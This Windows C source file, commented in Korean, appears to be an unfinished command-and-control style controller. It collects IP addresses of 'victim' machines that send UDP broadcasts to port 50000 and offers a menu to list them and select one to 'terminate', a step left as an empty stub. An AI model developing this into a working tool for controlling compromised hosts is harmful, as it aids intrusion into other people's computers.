#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment (lib, "ws2_32")
#include <WinSock2.h>
#include <stdio.h>

#define BROADCASTPORT 50000

//전역변수
char victimList[100][16] = { 0 };	//피해자 컴퓨터의 IP 목록


//피해자 목록을 출력하는 함수
void printVictimList()
{
	for (int i = 0; i < sizeof(victimList) / 16; i++)
	{
		//피해자 목록이 비어있다면 출력을 중지한다.
		if (!strcmp(victimList[i], "") && (i == 0))
			printf("목록이 비어있습니다. \n");
		else if (strcmp(victimList[i], "") == 0)
			break;
		else
			printf("%d. %s\n", i + 1, victimList[i]);
	}
}

//피해자 목록에 피해자 IP를 추가하는 함수
int insertVictimList(char* victim)
{
	for (int i = 0; i < sizeof(victimList) / 16; i++)
	{
		//피해자 목록이 비어있다면 추가한다.
		if (strcmp(victimList[i], "") == 0)
		{
			strcpy_s(victimList[i], sizeof(victimList[i]), victim);
			break;
		}

		//추가하려는 IP와 비교하여 같다면 추가하지 않는다.
		else if (strcmp(victimList[i], victim) == 0)
			break;
	}

	return 0;
}

//피해자 목록에 있는 피해자 IP를 삭제하는 함수
int deleteVictimList(char* victim)
{
	//피해자 목록에서 피해자를 찾은 유뮤를 저장한다.
	BOOL find = FALSE;

	//피해자 목록에서 피해자를 찾으면 삭제하고 나머지 목록을 위로 1칸씩 올린다.
	for (int i = 0; i < sizeof(victimList) / 16; i++)
	{
		if (strcmp(victimList[i], victim) == 0)
		{
			find = TRUE;
			ZeroMemory(victimList[i], sizeof(victimList[i]));

			if (i == sizeof(victimList) / 16 - 1)
				ZeroMemory(victimList[i], sizeof(victimList[i]));
			else
				strcpy_s(victimList[i], sizeof(victimList[i]), victimList[i + 1]);
		}
	}

	//피해자 목록에서 피해자를 못찾으면 오류를 리턴한다.
	if (find == FALSE)
		return 1;
	else
		return 0;
}

//오류 메시지를 출력하고 프로그램을 종료하는 함수
void err_quit(char* msg)
{
	//에러 코드로부터 오류 메시지를 만든다.
	LPSTR msgBuf;
	FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM, NULL,
		WSAGetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPTSTR)& msgBuf, 0, NULL);

	//오류 메시지를 알림창으로 띄운다.
	MessageBox(NULL, msgBuf, msg, MB_ICONERROR);

	//버퍼 메모리 반환
	LocalFree(msgBuf);

	//프로그램 종료
	exit(1);
}

//오류 메시지를 출력하는 함수
void err_display(char* msg)
{
	//에러 코드로부터 오류 메시지를 만든다.
	LPSTR msgBuf;
	FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM, NULL,
		WSAGetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPTSTR)& msgBuf, 0, NULL);

	//오류 메시지를 콘솔창에 출력한다.
	printf("[%s] %s\n", msg, msgBuf);

	//버퍼 메모리 반환
	LocalFree(msgBuf);
}

//브로드캐스팅 메시지를 수신하는 스레드 함수
DWORD WINAPI broadcastReceiver(LPVOID arg)
{
	int retval;

	//통신용 소켓을 생성한다.
	SOCKET sock = socket(AF_INET, SOCK_DGRAM, 0);
	if (sock == INVALID_SOCKET)
		err_quit("socket()");

	//지역 IP주소와 지역 포트번호를 설정한다.
	SOCKADDR_IN localaddr = { 0 };
	localaddr.sin_family = AF_INET;
	localaddr.sin_addr.s_addr = htonl(INADDR_ANY);
	localaddr.sin_port = htons(BROADCASTPORT);
	retval = bind(sock, (SOCKADDR*)& localaddr, sizeof(localaddr));
	if (retval == SOCKET_ERROR)
		err_quit("bind()");

	//통신에 사용할 변수를 선언한다.
	SOCKADDR_IN peeraddr;
	int addrlen = sizeof(peeraddr);
	char buffer[512] = { '\0' };

	while (1)
	{
		//데이터를 수신한다.
		addrlen = sizeof(peeraddr);
		retval = recvfrom(sock, buffer, sizeof(buffer), 0, (SOCKADDR*)& peeraddr, &addrlen);
		if (retval == SOCKET_ERROR)
		{
			err_display("recvfrom()");
			continue;
		}

		//송신자의 정보를 저장한다.
		retval = insertVictimList(inet_ntoa(peeraddr.sin_addr));
	}

	//통신용 소켓을 닫는다.
	retval = closesocket(sock);
	if (retval != 0)
		err_display("closesocket()");
}

//메인 함수
int main()
{
	int retval;

	//윈속을 초기화한다.
	WSADATA wsa;
	retval = WSAStartup(MAKEWORD(2, 2), &wsa);
	if (retval != 0)
	{
		printf("WSAStartup() 오류: %d\n", retval);
		return 1;
	}

	//브로드캐스트 메시지를 수신하는 스레드를 생성한다.
	HANDLE hThread = CreateThread(NULL, 0, broadcastReceiver, NULL, 0, NULL);
	if (hThread == NULL)
		printf("스레드 생성 오류! \n");
	else
		CloseHandle(hThread);

	//간이 셸을 이용한다.
	while (1)
	{
		int input;
		printf("\n");
		puts("1. 피해자 목록 확인");
		puts("2. 종료시킬 피해자 선택");
		printf("명령 입력: ");
		scanf_s("%d", &input);

		switch (input)
		{
		case 1:
			printVictimList();
			break;
		case 2:
			//피해자 선택 코드
			break;
		default:
			break;
		}
	}

	//윈속을 종료한다.
	retval = WSACleanup();
	if (retval != 0)
		err_display("WSACleanup()");

	return 0;
}